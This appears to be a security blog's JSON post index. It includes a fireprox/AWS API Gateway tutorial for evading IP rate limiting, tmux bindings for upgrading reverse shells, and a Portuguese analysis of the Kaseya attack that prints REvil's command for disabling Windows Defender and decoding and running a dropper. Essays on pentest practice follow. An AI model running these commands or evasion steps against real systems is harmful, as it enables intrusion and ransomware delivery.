[ { "title": "Using AWS API Gateway as a bypass for IP based rate limiting", "url": "/posts/using-aws-api-gateway-as-a-bypass-for-ip-based-rate-limiting/", "categories": "", "tags": "infosec, pentesting, web, rate-limiting, aws, api-gateway, cloud", "date": "2022-09-03 00:00:00 +0000", "snippet": " This is how you can bypass any IP based rate limiting defenses in your red teaming/pentesting engagements: An AWS Free Tier account and an API Gateway HTTP ProxyThe situationImagine you are performing a penetration testing and need to execute some kind of high traffic action such as, for example, a directory/file discovery on a web server. Sometimes this type of activity is not possible due to rate limiting defenses implemented, that is, you have some kind of protection that detects high traffic coming from a single IP and blocks this source from requesting resources from the web server for a period of time or, worst, puts the IP in a blacklist for good.Here is a very simple diagram of the situation:In this post we’ll see a tool that was recently introduced to me and we’ll see exactly what it does. But we’ll not dive into the tool. We’ll instead manually apply everything that it automates for us and why it bypasses the rate limiting protection. This is actually a post about one of the resources of the AWS API Gateway service.The toolOn a recent engagement I decided to use a tool called fireprox, introduced to me by my good friend Raphael Mota in order to bypass this protection on the target server. Of course, all the credits for the tool and the use of the API Gateway Proxy resource for this propouse are in the github page of the tool. I just learned and decided to write a post about it.What this tool does is to automate the process of creating an pass-through HTTP Proxy using AWS API Gateway service. The magic is that every request coming from this proxy has an unique IP address. You read it right! An unique IP address for every request! Well, that’s the solution to our situation. Let’s see this magic happening, but I’ll not cover how to create an AWS free tier account so the post doesn’t get too long.The first thing we need to do is create a new user in the “Identity and Access Management (IAM)” AWS service:Let’s give this user a name and mark the “Programmatic access” checkbox:Now let’s create a new group for this user. This is mandatory for the tool to work:Now we have to name the group and add the policy “AmazonAPIGatewayAdministrator” to it. This policy is needed so we can use this user’s credentials in the tool:Check if everything is correct and create the new user:Now write down the ACCESS KEY and the SECRET ACCESS KEY because we’ll use them in our tool:Now that we have a user created, we can use the tool. After cloning the repository with git clone https://github.com/ustayready/fireprox and installing the dependencies with python3 -m pip install -r requirements.txt, we can see what it does:So, we can issue commands using the tool and we have to pass the user’s acecss keys:So, we don’t have any API’s yet. Let’s create one. But first, we need a target. This target is a service where the proxy will send all the requests to. I’ll use a VPS of mine hosted by DigitalOcean. It will be a simple python web server:Now we can create a proxy using fireprox that points to our web server:So now, we can simply curl our newly created proxy and it will forward the request to our web server:Looking the web server log we see the request. Note the source IP address:We can see that this is not my real IP address:In fact, let’s simulate a directory listing attack and see what happens:See? One single IP address for every request! That’s awesome!!However, as a very famous saying in my country goes: not everything in life are flowers. Let’s use another python webserver and issue a request again:Ah-há! There’s a catch. The real source IP address is put in the header “X-Forwarded-For” and it arrives at the target. So if the web server or web application running on this server looks for this header, we’re done.To fix this, we can use a very neat resource provided to us by the API Gateway: a header mapping. Thanks to Fred Reimer for this awesome discovery!Turns out that we can send a custom header with our request, because fireprox creates a mapping from the header “X-My-X-Forwarded-For” to “X-Forwarded-For”, so we can control its content. Let’s see:Now, all we have to do is send one random IP address using this custom header and we’re done!Now you must be asking yourself what’s in this “server.py” file that allows me to see the header. Let’s take a quick look:This server simply uses the custom class “MyHandler” as base for actions based on the methods of the requests it gets. In this example, I only have actions for GET requests, jsut to make thing simple. we see that all it does is get the header i want and print it on the screen. The function “connection” serves the service and waits for incoming connections.Under the hoodNow that we know how the tool works, let’s see what it does with our AWS credentials. Let’s go to the API Gateway service and see what’s there:As we can see above, fireprox creates a simple API structure. Let’s see the configs for this GET method:We can see a very clear structure: on the left, the client, in our case the curl command. On the far right, the target application on port 8585. In between, the proxy.Now, notice that we have the “Method Request” and the “Integration Request” boxes. The first one is the request that comes from the client. See the “X-My-X-Forwarded-For” header? This box knows that this header will come within the request.Also, we have the header “X-Forwarded-For” in the “Integration Request” box, that represents the request going from the proxy to the final destination. Let’s see how this header mapping works:Clicking on the “Integration Request” box, we can see its details, which include HTTP headers. See that we have one entry for that and there’s a mapping going on: The contents of the “X-Forwarded-For” header comes from the contents of the header “X-My-X-Forwarded-For” header from the client request. That’s how we can change the header contents. Now you must be wondering: but what if we simply delete this header entry? Let’s see:Issuing another request:See? Somehow the behavior is still the same. My real IP address continues to leak through the “X-Forwarded-For” header. Somehow we still have the mapping in place even after deleting the header. And if we also delete the custom header from the “Method Request” box, the result is the same. So we must use this custom header if we want to prevent our IP from leaking in the final request to the target application.Simulating requests with random IP addressesTo conclude our journey, I’ll run a final attack simulation, but this time I’ll also simulate a server that permanently blocks IP addresses that send requests faster than 10 per second.First, let’s create a very simple Python script that runs with threads and sends requests to our server:Python script for simulating sending requests using multi threading The function random_ip() just returns a random valid IP address; The function send_request() sends as many requests as the number passed in command line to the option “–requests”. It’s called once for every thread; All threads are spawned, each one calling the function send_request() with the arguments url, requests and delay.Now the target web server:Soon… How to protect your application against this type of attack? Soon… Final thoughtsIt’s needless to say that this is an amazing tool. And because I’m a little bit lazy, I’ll just paste the print for the credits:As a final thought, please, don’t use this method in places you don’t have permission to. You can violate the AWS policy and get yourself in big trouble." }, { "title": "Kaseya Supply Chain Attack", "url": "/posts/kaseya-supply-chain-attack/", "categories": "", "tags": "", "date": "2021-07-05 00:00:00 +0000", "snippet": "IntroduçãoHá alguns dias atrás, a comunidade de segurança ao redor do mundo precisou se ocupar com o apelidado PrintNightmare. Uma falha crítica foi identificada no serviço de impressão do sistema operacional Windows e que afeta diversas versões do software, inclusive aquelas usadas em Domain Controllers.Dois dias adentro, contudo, outro evento ocorreu que, a princípio, foi ofuscado pelo que já estava ocorrendo. Um ataque de proporções exponenciais ao software VSA da empresa Kaseya comprometeu milhares de clientes de dezenas de MSPs nos Estados Unidos.De acordo com as fontes consultadas, o software VSA da empresa foi comprometido por um 0-day que permitiu que uma atualização falsa fosse emitida para os clientes dos MSPs que usam a opção on premisses. A imagem abaixo pode ilustrar melhor a cadeia de ataque:Cadeia de ataque ao Kaseya VSA e clientes dos MSPsComo pode ser visto acima, os atacantes exploraram dezenas de servidores VSA que estavam expostos na internet e induziram atualizações falsas aos agentes instalados nos clientes.O mais agravante desse ataque é o fato de que os agentes nos clientes são executados com permissões elevadas, o que permite plenos poderes ao ataque. Com isso, foi possível, por exemplo, emitir comandos para desabilitar diversas proteções nos endpoints afetados, como o Windows Defender.Detalhes Técnicos do AtaqueO ataque, inicialmente, explorou falhas como bypass de mecanismo de autenticação, upload de arquivos arbritários e até injeção de código nos servidores VSA.A partir daí, um prodecimento foi agendado para enviar uma atualização falsa a todos os computadores gerenciados pelos servidores afetados. Tal atualização incluía ações de desabilitar proteções e download/desofuscação e execução de um ransomware da gang REvil, que opera o chamado Ransomware-As-A-Service, ou seja, eles vendem ransomware como um serviço. Abaixo temos parte dos comandos que foram executados nos clientes afetados:execFile(): Path=&quot;C:\\windows\\system32\\cmd.exe&quot;, arg=&quot;/c ping 127.0.0.1 -n 7615 &amp;gt; nul &amp;amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend &amp;amp; copy /Y C:\\Windows\\System32\\certutil.exe C:\\Windows\\cert.exe &amp;amp; echo %RANDOM% &amp;gt;&amp;gt; C:\\Windows\\cert.exe &amp;amp; C:\\Windows\\cert.exe -decode c:\\kworking1\\agent.crt c:\\kworking1\\agent.exe &amp;amp; del /q /f c:\\kworking1\\agent.crt C:\\Windows\\cert.exe &amp;amp; c:\\kworking1\\agent.exe&quot;, flag=0x00000002, timeout=0 secondsAnalisando o bloco acima: execFile(): Path=”C:\\windows\\system32\\cmd.exe”, arg=”/c ping 127.0.0.1 -n 7615 &amp;gt; null”A primeira parte do código invoca o cmd.exe e passa como argumentos primeiramente o comando ping para o localhost (127.0.0.1), especificando exatamente 7615 pacotes a serem enviados e descartando quaisquer saídas textuais (&amp;gt; null). O objetivo desse comando ping provavelmente é o de causar um atraso no processo de decodificação e execução do dropper e do ransomware. Essa abordagem pode ser útil em alguns casos para enganar os mecanismos de defesa (que ainda estão ativos). C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSendA seguir, ainda como argumento passado ao cmd.exe, é chamado o powershell.exe, que executa o comando Set-MpPreference, que permite alterar configurações do Windows Defender. Para ele são passadas as opções a seguir: -DisableRealtimeMonitoring $true: Desabilita a proteção em tempo real. -DisableIntrusionPreventionSystem $true: desabilita proteção de rede para vulnerabilidades conhecidas. -DisableIOAVProtection $true: Desabilita a verificação de arquivos e anexos baixados. -DisableScriptScanning $true: desabilita a verificação de scripts durante a verificação de malware. -EnableControlledFolderAccess Disabled: Desabilita a proteção de arquivos contra ransomware e outras ameaças. -EnableNetworkProtection AuditMode -Force: Desabilita a proteção contra acesso a domínios potencialmente perigosos e maliciosos, como domínios utilizados por campanhas de phishing, servidores de comando e controle e até mesmo de controle de ransomware. -MAPSReporting Disabled: Desabilita o envio de informações ao Microsoft Active Protection Service (MAPS) -SubmitSamplesConsent NeverSend: Desabilita o envio automático de samples para a Microsoft.Após desabilitar as proteções, é iniciado o processo de execução do ransomware, que começa utilizando o comando a seguir: copy /Y C:\\Windows\\System32\\certutil.exe C:\\Windows\\cert.exe &amp;amp; echo %RANDOM% » C:\\Windows\\cert.exeO comando acima cria uma cópia do utilitário certutil.exe, cujo nome é cert.exe. Após isso, é acrescentado um número aleatório ao final do arquivo novo:Manipulação do utilitário certutil.exeA técnica acima pode ter sido feita para alterar a assinatura do executável original, já que, além do nome “certutil”, o hash dele pode ser monitorado ativamente para detecção de execuções maliciosas. C:\\Windows\\cert.exe -decode c:\\kworking1\\agent.crt c:\\kworking1\\agent.exe &amp;amp; del /q /f c:\\kworking1\\agent.crt C:\\Windows\\cert.exe &amp;amp; c:\\kworking1\\agent.exeSeguindo o fluxo de execução, é possível ver que o novo arquivo cert.exe é usado para realizar a decodificação base64 do arquivo agent.crt, que provavelmente foi colocado em todos os endpoints afetados pelo processo de atualização falsa. Em seguida, o novo arquivo, agent.exe, é criado e depois agent.crt e cert.exe são deletados. Finalmente, agent.exe é executado.agent.exe é um executável conhecido como dropper, que tem por função baixar e executar o código malicioso final, ou seja, o ransomware. Neste caso, ele baixou um executável legítimo do Windows Defenter, o MsMpEng.exe, e também uma DLL chamada mpsvc.dll, que é o ransomware propriamente dito. Entretanto, legitimamente falando, MpSvc.dll é uma biblioteca que faz parte do Windows Protection Service, e é utilizada pelo Windows Defender. Esse mecanismo foi utilizado no ataque provavelmente como forma de execução disfarçada do ransomware.A execução do arquivo MsMpEng.exe carrega automaticamente a DLL MpSvc.dll, que inicia o processo de criptografia dos arquivos do sistema afetado.Uma vez afetado, o sistema passa a ficar assim:Sistema afetado pelo ransomware REvil no ataque de Suplly Chain do Kaseya VSAInstruções de preço e pagamento pelo processo de descriptografia dos arquivosEvolução do CenárioA partir do momento que foi detectado, a comunidade de segurança logo começou a agir para investigar o incidente e realizar medidas de mitigação do ataque. O que segue abaixo é uma timeline de ações e notícias:No dia 3 de julho a Kaseya confirmou o ataque. A partir daí várias informações de impacto começaram a surgir: Mais de 30 MSPs foram afetados ao redor do mundo; Rede de supermercados sueca Coop fechou mais de 400 lojas na sexta-feira depois de seus pontos de venda e checkouts terem parado de funcionar; 11 escolas afetadas pelo ataque; Falha do software VSA provavelmente foi um 0-day de bypass de mecanismo de autenticação da interface web; Equipe de pesquisadores alemães estavam em processo de responsible disclosure com a Kaseya no momento do ataque; A empresa MawareBytes detecta um aumento considerável do uso do ransonware REvil ao redor do mundo;Aumento de detecções do malware REvil A gangue REvil se responsabilizou pelo ataque e exigiu a quantia de US$70.000.000,00 em BTC para liberar um decryptor para todos os afetados; A Kaseya liberou no dia 5 de julho uma ferramenta de detecção de comprometimento, mas pede que todos os servidores VSA on premisses permaneçam offline. A empresa HuntressLabs, por meio do update 12 na thread no Reddit, afirmou que o vetor inicial de ataque foi um bypass no mecanismo de autenticação da interface web, garantindo uma sessão autenticada ao atacante e, após isto, realizar o upload do payload original e executar comandos via falhas de SQL injection.ConclusãoA investigação ainda está em andamento, até o momento da escrita deste post, mas já é possível dizer que este é um dos maiores ataques cibernéticos da história.Assim que mais atualizações forem acontecendo, eu altero o post original para incluir os avanços.Referências Kaseya supply chain attack targeting MSPs to deliver REvil ransomware — TRUESEC Blog Kaseya supply chain attack delivers mass ransomware event to US companies Mark Loman @🏡 no Twitter: “If your endpoint is hit, the initial ransom demand is 44,999 USD. https://t.co/gSWbxYJbeX” / Twitter Crticial Ransomware Incident in Progress : msp (reddit.com) [UPDATED: Thousands attacked as REvil ransomware hijacks Kaseya VSA — Malwarebytes Labs Malwarebytes Labs](https://blog.malwarebytes.com/cybercrime/2021/07/shutdown-kaseya-vsa-servers-now-amidst-cascading-revil-attack-against-msps-clients/#detection-tool) Nicole Perlroth no Twitter: “As it turns out, the “zero day” used to breach Kesaya wasn’t a zero day. Dutch researchers tipped the company off to the issue, but Kesaya still hadn’t rolled out a patch when REvil used it for its ransomware spree.” / Twitter Worldwide ransomware attack: St Peter’s College and 10 other schools hit by US cyber attack — NZ Herald Important Notice July 4th, 2021 — Kaseya [Set-MpPreference (Defender) Microsoft Docs](https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2019-ps) [Ativar a proteção de rede Microsoft Docs](https://docs.microsoft.com/pt-br/microsoft-365/security/defender-endpoint/enable-network-protection?view=o365-worldwide) MpSvc.dll — What is MpSvc.dll? — Service Module (fileinspect.com)" }, { "title": "Using tmux for automating interactive reverse shells", "url": "/posts/using-tmux-for-automating-interactive-reverse-shells/", "categories": "Linux, Infosec", "tags": "linux, terminal, tmux, pentest, reverse-shell", "date": "2021-07-02 00:00:00 +0000", "snippet": " Automating the process of converting a non-interactive reverse shell to a fully interactive TTY.IntroductionI’ve recently read agreat post about using the “expect” command line utility for automating the process of converting a non-interactive reverse shell to a fully interactive TTY, which means that by doing that, it’s possible to use features like tab completion, history navigation, clear the screen and, among others, being able to hit Ctrl-c without losing your access, which makes me really happy.I’ve found the post very interesting because it uses a completely different approach that I had never seen before. So, since I also have a technique for automating this process, I decided to share it because it’s a different perspective, which also relies on a command line utility: tmux.The manual processCreating an interactive reverse shell manuallyThe above gif shows how you can convert a non-interactive reverse shell into a interactive one. Although it’s a fairly simple process, if you have the need to do it very often, it becomes a pain.Enter tmuxTmux is a terminal multiplexer command line utility that lets you create/control multiple shells from a single screen. One of its most powerful features is the ability to send keystrokes combinations into the shells automatically. Added to that is the feature that lets me create internal environment variables that I can use as short versions of big commands:Command strings being stored as environment variablesNow I can simply open tmux command prompt and send one of those strings into the currently active tmux pane:Sending strings into shells using tmuxThe magic of tmux automationNow that we know all of the features we need to use from tmux, we can build tmux shortcuts, or key bindings, in order to trigger actions of sending keystrokes to the currently active pane.Tmux key bindings for sending keystrokesThe “tmux.conf” lines above consist of two environment variables that hold two strings that will be send to the terminal later and two key bindings that will first send the key sequence _python3 -c ‘import pty;pty.spawn(\\”/bin/bash\\”)’_ followed by a _&amp;lt;Enter&amp;gt;_, and then send the sequence _C-z “stty raw -echo” Enter fg Enter reset Enter $shellexports Enter_. Note that “Enter” is not the word itself, but the *keystroke*, that is, a newline character. Tmux has a set of words that it recognizes as certain keyboard keys and “Enter” is one of them.The first bind command has to be executed after the prefix key combination, which in standard tmux is Ctrl-b, but in my case is Ctrl-a. The second bind command, which has the flag -n can be executed without the prefix combination.Here you might be thinking: “but why are you using two shortcuts instead of just one that sends everything at once?” The answer for that is simple: I wasn’t able to get it working by using only one key binding. If you find a way, please contact me because I’d love to know what I’ve missed.The final resultNow every time you get a non-interactive shell, you can simply hit Ctrl-aqq in order to trigger the first binding (Ctrl-aq) and then sending the second part (Ctrl-q). Enjoy:Fully automated interactive shell from a non-interactive one\\x07\\x44\\x42\\x01\\x59\\x13\\x44" }, { "title": "White Box Penetration Testing: &#39;Cheating&#39; in order to boost impact and value", "url": "/posts/white-box-penetration-testing-cheating-in-order-to-boost-impact-and-value/", "categories": "Infosec, Pentest", "tags": "infosec, white-box, pentest", "date": "2021-02-05 00:00:00 +0000", "snippet": "Almost every professional pentester is always thrilled when a black box pentesting comes along, however it’s probably in white box that you’ll be able to give your reports more meaning.IntroductionEvery pentester knows (or at least they should) that when a new project is about to happen, they need to know, among other things, what level of information they are going to receive from the client prior and during the execution. This is important because it will impact how the work will be conducted. There are nowadays some well known names that define in high level how much information the offensive team will get. These are black box, gray box and white box. It’s not hard to find places on the internet that explain these types of penetration testing. I’ll go over their main aspects so you and I are both on the same page:Black BoxThis is the most famous one. The reason for this is that it is the most challenging for the pentesters because they get almost no information at all from the client besides the domains, URL’s and IP ranges in scope.Finding a critical vulnerability while conducting a black box testing is always quite a ride and it makes the report look much better from the attacker’s perspective.The client usually gets impressed (and scared) by the findings when the project is conducted this way. This is because black box reminds a real attack more than the other types. See, a real attacker will have no prior information about its targets and they’ll have to work hard to find what they need in order to be successful. And this is exactly what we are doing.The pros of doing black box pentesting include having a more realistic scenario, which gives the client a better view of how easy/hard it is to break into their environment from an attackers perspective.The cons include a higher probability of vulnerabilities that were not found and can still be exploited by real attackers. This is indeed one of the most difficult facts that we have to accept: we are not going to find everything. Of course, things like experience and technical skills can lower these odds, but the truth is that we can never be sure. And being in a black box project only makes things worse in that aspect.Grey BoxThis is an interesting one as it gathers a little bit of both worlds. The main characteristic here is partial knowledge. The client and the team will discuss what kinds of information will be shared and in what amount. Usually this is done when there are very specific needs for the client. Doing a black box testing on a custom app that is hosted on a very specific environment can be very hard and might not produce the desired results, for example.Another scenario where grey box testing is often considered is when you have to test an app that is heavily protected by firewalls, WAFs and other appliances. How can you test something that you can not reach? You will be testing only the protection’s effectiveness, but the app itself might have critical flaws. Will you really trust the defenses 100%? What if when a 0-day comes out and the app is finally exposed? For these what you can do is open up your defenses only for the team that is conducting the tests and let them do their job without having to worry about bypassing protections when the goal is really to test the app.White BoxHere we go! The most underrated, underestimated and misunderstood of all. White box testing focus on results, that is, finding the highest amount of vulnerabilities using the least amount of effort regarding collecting information.This type of execution relies heavily on collaboration between the offensive team and the client’s technical staff. That’s because they’ll have to constantly go over each and every one of the assets in scope in order to get information. The key here is not wasting time doing information gathering. We don’t have to because now we have access to all the people responsible for developing and maintaining the assets. So we can ask them all sorts of questions: “what’s running on these servers?”, “what does this service do?”, “let me look at the source code for this feature, please?” and even “can you give me a low privilege user account so we can test for privilege escalation?”.I’ll go over the pros of white box testing next. For now the only con I can think of is being far from a real attack scenario. You can not have a realistic pentest while ask the devs or sysadmind for the admin password (or can you?).The real meaning of a penetration testingWhen we execute a pentest, often times the only things we care about is to find those critical or high so we can once again prove ourselves as 1337 hackers. But what you may be forgetting is that we are professionals and as such, our real goal is to deliver value to whoever hired us. By value, I mean the client receives a product that’s worth the money they put into your pockets because they know that they can use the information in it to better secure their business. And we know very well that no matter how a vulnerability is discovered, if you find it, the’ll like.Where white box thrivesAs I’ve already mentioned, in white box pentesting, we don’t have to worry too much on gathering information about the targets ourselves because all we have to do is ask. And here is where we can do a really great job.By asking the right questions to the right people, we get to know things that we might never know if we were on a black box or even on a grey box test. And while listening to the answers, we can put our “malicious” minds to work by correlating the information we’re getting with what we know.Let me give you some examples:Imagine you’re testing a web application and you find a form that might be vulnerable to SQL injection. You can first ask if there’s any protection guarding the app and if so, can they disable it just for you? You can also ask them to see the source code that handles the parameters the user input so you can see if they’re sanitizing and validating the data.Another good example for white box is when you are testing a very specific network configuration. You can suggest to have all the information on the network design, IP’s, services and everything that might be useful so you can more accurately assess the implementation.I know what you may be thinking right now: “This is cheating!” Is it really? Are you playing a CTF or a video game? No. You’re a professional who’s being hired to do a job and it’s your responsibility to better advice your clients about the best possible options so they can have real value from your final product.The real world is not so simple, thoughEverything I said so far is wonderful in paper. However it’s not always how things go. Let me give you a dose of reality:The client almost never will be able to allocate a professional just for you. What usually happens is that one or two people are pointed out to answer your questions and they’ll pile up this task with their current work. So, often times you’ll get people that take ages to answer, what will certainly delay your schedule.Another thing that happens a lot is when the client doesn’t want to pass information at all, even knowing what they’ve hired and that you signed an NDA. You’ll have to “fight” to get the information you need or worse: you end up doing a black/grey box testing.Finally, this is for me the most dangerous situation: you get a client that is willing to answer all your questions. That’s great! But you must keep in mind that you CAN NOT trust 100% of what they say. Remember that they’re biased with their business and their product. I already heard a lot of “Oh, but there’s nothing worth looking in this server. It’s completely isolated and there’s no information there.” only to prove them wrong in the end. You can’t let them “poison” your mind, so be skeptical. Always!ConclusionFor the clientsIf you are considering to hire a pentesting company or if you have an internal team, consider doing white box assessments in certain situations. Remember that the ultimate goal here is to protect your environment and the data in it, and doing so you protect your business. Doing an open information testing will give the offensive team more probability of finding things that would be more difficult to find in black box executions. And keep in mind that being difficult for your team to find something doesn’t mean that it’s also difficult for the real bad guys. They have all the time in the world to poke your environment and they have no scope restrictions. Also, they can be much better skilled hackers than your guys.For the professionalsAnd for you pentesters out there, I leave the following: don’t think you’re cheating when you do a white box pentest. Leave this mindset for when you’re playing CTF’s. When you do your job, the goal must be to deliver real impact and real value through your reports. So know when to use all the tools and options you have available." }, { "title": "This is how you can deliver true value through your pentest reports", "url": "/posts/this-is-how-you-can-deliver-true-value-through-your-pentest-reports/", "categories": "Infosec, Pentest", "tags": "report, documentation", "date": "2021-01-12 00:00:00 +0000", "snippet": " There are only two things your client wants: how their business can be affected by impactful exploitation of a vulnerability and how they can prevent this from happening?The ScenarioLet’s say you are hired to perform a two-week penetration testing on a client’s major web application facing the internet. They’re interested in knowing if it has any flaws that can be exploited by a malicious actor. As a plus, they want you to act as closely as possible as a real threat actor, that is, your testing will be black box.You begin to prepare your toolbox of tactics, techniques and procedures that will fit the job’s requirements and on the agreed date you start playing with the application. Cool, here we go!Soon the two weeks fly by and you have a reasonable amount of vulnerabilities that you were able to successfully exploit and document.Now that you have finished the fun part, you start to put all of the findings in a report, so your client can fix the flaws as soon as possible. That should be easy to do, right? You just take each finding and put them in a table/list like format, present the PoC codes and you’re done. Piece of cake.The problemNow comes the day of the presentation, where you’ll be able to show off your leet skills on how you were able to bypass their WAF and how this allowed the full compromise of their Active Directory (AD) and, as a consequence, their entire environment. You showed them a nice obfuscated payload for a XXE, showed also how you used CrackMapExec to enumerate the AD and finally you presented a very nice BloodHound graph that shows all the weak configurations that you used to compromise the environment.At the end of the presentation, the tech members, responsible for understanding the vulnerabilities so they can fix them, were stunned because they knew exactly what you had accomplished, but they started asking several questions about various parts of the process because for them it wasn’t clear how you did what you did. You tell them to look at the technical details in the report for further clarification, but you see in their faces that this didn’t help much.To make thing worse, the C-level on the meeting, which was the guy who hired you in the first place, had a poker face that you didn’t notice at first, but soon he also started asking several questions about what you could have done with what you found. He had already read the entire report and even so, he wasn’t able to get the point you were trying to make on the presentation.After you tried to answer questions that for you were so obvious, like “What could you have done with Domain Admin credentials?” or “What are those symbols in the payload used for the XXE?”, you go home asking yourself what went wrong. Why did they have so many questions? You thought you were going to nail the presentation.The explanationNow I’m going to show you why this can happen and how you can fix this problem. I’ll divide this part into two: executive and technical communication.Technical communicationHere we have a few reasons where a situation like this can take place. The first one is about you overestimating the technical member’s knowledge of offensive security. You have to understand that our job is kind of unique, that is, we know that IT is a very diverse field; we have programmers, sysadmins, blue teamers, red teamers, tech support, printer magicians etc. The point is that everyone has a different area of study and different background. You cannot assume that every IT professional you talk with will understand 100% of what you’re saying.To address this specific issue, there are some things you can do: Explain in great details everything you did. Pretend that you are talking to a child about a complex topic, so this way you can come close to have a very detailed and didactic explanation; Organize your exploitation flow. This is about having a nice and easy to follow a story, where you can link every single action and make them talk to each other. This way you can more easily communicate your path inside the environment; Everything has to have references. Remember that you cannot assume that the tech team will understand each and every term you throw at them, so make sure you include reliable sources for every claim or every term that you’ll use. This is also helpful so you can show them that you are not making anything up, everything has a reason and a proper trustworthy source; The recommendations are the most important part. You have to make sure they’ll get the best possible recommendation for fixing the vulnerabilities you found. And this means explaining in detail why this recommendation is the right one. Also, make sure to include the proper sources for them; Take a lot of screenshots, they are free! However, every single screenshot you take must have three items so they don’t turn out useless or create difficulties instead of helping: Detailed description: have you ever heard the quote “an image is worth a thousand words”? This applies very well in this case because you can’t think that an image alone will be enough to explain some technique you are trying to show. So, as soon as you take the screenshot, describe it, tell what you just did and how this connects with the process; Don’t take a screenshot of your entire monitor. Excess of useless information will do no help. Of course, there are situations where you will have to do this, but for most cases, you only have to capture enough to contextualize the reader and show the information you want to show. To help with this matter, it’s helpful to use a screenshot tool, like flameshot (my personal companion and recommendation) or greenshot. Both of them solve this problem for you because you can drag a rectangle on the screen to mark what you want to capture; Highlight the important stuff. Speaking of screenshot tools, you can also use them to draw on your pictures with ease. There are two critical cases when you want to do this: to hide information you don’t want to show (passwords, names etc) and to point out specific pieces of information on the picture to draw the readers attention, so they don’t feel lost without knowing where to look.I think that if you address those topics, you’ll be able to boost your technical report so your audience can better understand what you’re trying to communicate.Executive communicationNow comes the most important part of your job: to be able to effectively communicate with the people who hired you. Remember all the questions they’ve asked you? Well, this means that they didn’t understand your language, both in the report and the presentation. Remember: they’re not technical people, they are business people. So you have to be able to speak their language if you want them to understand the importance of your findings. This means that you have to: Speak using non-technical terms. It doesn’t matter if you explained what an XXE attack is or that you were able to compromise the Domain Admin account. They are not interested in knowing that. What matters for them is how this can damage their business, their clients or their client’s data; Show real business impact. This is why they hired you in the first place. So your job is quite incomplete if you don’t show them how their business can be affected by the things you’ve found. To do that, the first thing you have to know is what’s their business about. In your first meeting, take some time to ask a few questions about what they do, how they operate and what is the most important things for them. Even if you get superficial answers, it’s better than nothing. This way you’ll be able to link everything you found to their respective business impacts. Some examples might include: Client data theft (might lead to legal issues); Secret theft (patents, source codes etc); Employee data theft (might lead to legal issues); Stock market performance might be severely affected (show some examples);Another thing you can mention about business impact is how bad these flaws fall under the Brazilian LGPD law (or any other law regarding data protection). They can lead to huge fines and other severe consequences to the company. Finally, the last thing about executive communication is the writing of your report. It’s empirical that you are able to write well. Written communication is essential for the proper understanding of what you want to pass. This means that you must have good grammar skills, as well as be able to clearly communicate what you want. For this, you can always take a course in your native language or even look for some free online resources to learn and be more proficient. Remember that the best workers are known for their attention to detail, and your language and writing skills are the main tools you will use to deliver the product your client wants. And as the last point, this part doesn’t apply only to the executive part of your report. It’s needless to say that the entire document must benefit from clear and concise writing.ConclusionAfter this journey, we can clearly see that it takes so much more than being a leet hacker if you want to be a professional pentester. We can also see that all the details sum up to deliver a great final product, one that you’ll be proud of and you’ll know that your client will get the value they were expecting.A great pentest report is the one that speaks for itself, that is, it can communicate effectively with both executive and technical audiences." }, { "title": "Learning from your mistakes as an offensive security professional", "url": "/posts/learning-from-your-mistakes/", "categories": "learning, methodology", "tags": "mistakes, red-team, pentest, infosec", "date": "2020-12-28 00:00:00 +0000", "snippet": "IntroductionIn both my personal and professional lives I try my best to live by a simple statement: “Your failures are the building blocks of your success”. But having a nice motivational quote means nothing if it stays only on paper (or screen). So, for a while now I had this idea of actually convert its meaning into action and the perfect opportunity had just knocked on my door.You see, last month I began a new professional challenge: to lead a red team. I’m not diving into what a red team is, but I now have a job where I must technically guide the team while planning and executing our projects and developing ourselves.Very recently me and my team mate Gustavo Viana performed a certain engagement against our company. The action lasted for about half an hour and as soon as it ended, we were approached by our manager: “I was just asked if the Red Team was doing something on our &amp;lt;service name&amp;gt;. Are you?”It was at this moment we knew: we fu….ed up.On the same day, after all the dust settled, I realized that this particular incident could be the one that would turn this old idea of mine into something actually useful: to be able to register my professional mistakes so I could really make them the building blocks of my professional success.However, now I’m not just a member of my team. I lead it. So guided by that thought, I saw that I could extend my idea to the whole team and make it a methodology.First things firstBefore I begin to walk you through the process, I have to tell you that all of this is completely useless if you can’t come forward on your own mistakes. Be humbled by the fact that you’re human, imperfect in every possible way, and you make mistakes every time. The great thing about being human, though, is that you can learn from not just your own mistakes, but from others.What to register?Well, everything you can think it’s important to detail exactly what happened, when it happened and why it went wrong. You also want to include every single technical detail about the environment, the technical and business impacts your team’s mistake created, the consequences generated, negative and positive, and, of course, the lessons learned from the event.Where to register?Personally, I use Joplin for note taking, so I just created a new notebook under my companies main notebook. Each note means one event where mistakes were made. Now, one thing I had in mind is the fact that I’m not doing that just for me, but for my whole team. So the ideal situation is if or those notes to be available for everyone on the team. My only warning here is that the notes must be stored in a safe place.The note templateBelow you can see the note template I created in Joplin with the help of my colleague:How to fill in the topics?What I recommend for the topics “Action”, “Technical details”, “Impact” and “Consequences” is that you gather as much information as possible, so you have them rich in details. This will help to remember the event in the future. Also, involve the team in the process. They can help you to grow the details and even add more information.As for the remaining topics, the most important ones, it’s highly recommended that you do a brainstorming session with the whole team (not only the members who participated in the event) so all the possible mistakes and lessons can be extracted.The methodologyAs a team leader, I’d like this methodology to be part of the team’s day to day, so everyone knows what needs to be done and why. Because of that, I came up with some rules that I think are essential for this to work as intended: All the notes and brainstorming sessions are restricted only to the team. Absolutely no names must be mentioned. The purpose here is not to register who made the mistake, but learn from it. The team leader must ensure that nobody is bullied for making a mistake. As I already said: mistakes are great opportunities for learning and they must be treated this way if you want a more mature team. So it’s your responsibility as a leader to plant that mindset seed inside the team’s head. The notes must be securely stored and accessed. This is optional: I recommend that every new member of the team go through all the existing notes, so they can see what the team has already gone through and all the good lessons they’ve learned. It’s a great way for the newcomers to also learn those lessons, but without having to make the same mistakes.Final thoughtsImagine if every team had a methodology for learning from its own mistakes. Imagine what great lessons are now lost because people think mistakes are ugly and embarrassing things that must be pushed under the carpet.It’s really great to have a way to register those tense moments and all the 